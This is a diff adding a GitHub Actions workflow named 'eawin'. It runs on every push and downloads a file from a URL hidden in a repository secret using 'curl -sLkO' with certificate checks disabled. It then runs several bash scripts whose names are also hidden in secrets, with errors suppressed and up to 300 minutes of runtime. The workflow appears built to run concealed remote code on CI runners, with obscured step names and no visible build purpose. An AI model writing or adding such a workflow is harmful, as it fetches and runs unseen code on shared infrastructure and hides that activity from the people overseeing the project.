@@ -1,0 +1,30 @@
+name: eawin
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: eawin1
+       uses: actions/checkout@main
+
+     - name: eawin2
+       timeout-minutes: 5
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: eawin3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+             bash ${{ secrets.EA_GH }}
+     - name: eawin4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_IJ }}
